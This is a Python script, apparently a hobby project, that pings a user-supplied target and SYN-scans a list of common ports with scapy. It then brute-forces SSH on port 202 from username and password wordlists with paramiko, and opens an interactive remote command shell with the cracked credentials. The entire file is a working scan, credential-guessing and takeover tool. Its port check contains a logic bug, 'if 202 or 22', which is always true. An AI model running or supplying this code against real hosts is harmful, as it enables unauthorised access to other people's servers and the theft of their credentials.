from scapy.all import *
from scapy.layers.inet import *
import logging
import paramiko

# first check if target is up by piging it
target = input("Please Enter Target IP:\n")
# expirimenting with new library
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
# setting up ping
ping = IP(dst=target) / ICMP(type=8)
# sending and recieving
answere = sr1(ping, timeout=2)
# the basic port scanner will run only if the ping returns a response
if answere:
    open_ports = []
#   setting up a nice GUI
    print(f'scanning +{target}+ for open TCP ports \n')
#   for every port in the list the code tries tp send a SYN packet to the target machine
    try:
        for port in [80, 443, 21, 22, 202, 2220, 25, 53, 23, 465, 143, 8080]:

            Packet = IP(dst=target) / TCP(dport=port, flags='S')
            response = sr1(Packet, verbose=0, timeout=5)
#           print(response)
#           if there is a response, the code then check for TCP layer
            if response is not None:
                # if it has that TCP layer, it then strips it to see if the respons is SYNACK,
                # and if it is, then the responding port is added to the open_ports list.
                if response.haslayer(TCP) and response.getlayer(TCP).flags == 'SA':
                    open_ports.append(port)
#                      the connection is then finished and closed
                    send(IP(dst=target) / TCP(dport=response.sport, flags='A'), verbose=0)
                    send(IP(dst=target) / TCP(dport=response.sport, flags='R'), verbose=0)

                else:
                    pass
#   error handling
    except (AttributeError, Scapy_Exception) as e:
        logging.error(f"An error occurred: {e}")

    else:
        pass

    print("Scan complete\n\n")
    print(open_ports)
#   remembering that the target port for this "attack" is port 22, it its on the list the program
#   will then try to brute force its way in.
    if 202 or 22 in open_ports:
        print("\nBruteForcer STARTING...\n")

# defining the basic brute force program that will to the heavy lifting
# when it comes to finding the passcode combination.


def brute(target_ip):
    # getting the source files ready to be searched through
    with open("/home/yair/Downloads/passwords001.txt", "r") as pass_effort:
        passwords = pass_effort.read().splitlines()
    with open("/home/yair/Downloads/usernamens001.txt", "r") as possible_nanas:
        users = possible_nanas.read().splitlines()
#   the for loop that will iterate through the given files in search of the
#   correct combination
    for password in passwords:
        for user in users:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(target_ip, port=202, username=user, password=password)
                print(f"Successfully Connected with :\nusername as - {user} \npasswd as: {password}")
                return user, password
            except:
                pass
            finally:
                ssh.close()

# extracting the values of the correct combination for future use


name, passwd = brute(target)

# creating a function to send and handle commands


def commands(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    output = stdout.read().decode()
    error = stderr.read().decode()
    return output, error

# creating a function that will allow me to take control of the target


def final_stage_Brute(target_ip, username, password):
    # setting up the sshClient with paramiko
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # connecting via the specified port
    try:
        ssh.connect(target_ip, port=202, username=username, password=password)
        print("Connection Established!\n")

        current_dir = ''
        # setting up a while loop that will run as long as
        # i dont send the "exit" command
        while True:
            command = input(f"{target_ip}@#{username}:{current_dir}~ ")
            if command.lower() in ["kill", "exit", "x"]:
                break
            # in order to allow me to run command on whatever directory im currently in :
            if command.startswith('cd '):
                new_directory = command.split(' ', 1)[1]
                command = f"cd {new_directory} && pwd"
            # handle output and errors
                output, error = commands(ssh, command)
                if output:
                    current_dir = output.strip()
                if error:
                    print(error)
            else:
             # making a nice looking GUI for every other command
                if current_dir:
                    command = f"cd {current_dir} && {command}"
                output, error = commands(ssh, command)
                    # handling errors and exceptions
                if output:
                    print(output)
                if error:
                    print(error)
    except Exception as E:
        print("an ERROR occurred", E)
    finally:
        ssh.close()

# the choice


C = input(f"Would you like to Take control of {target}?\ny/n:\n")
if C.lower() == "y":
    final_stage_Brute(target, name, passwd)
else:
    print("Brute shutting down...\n")
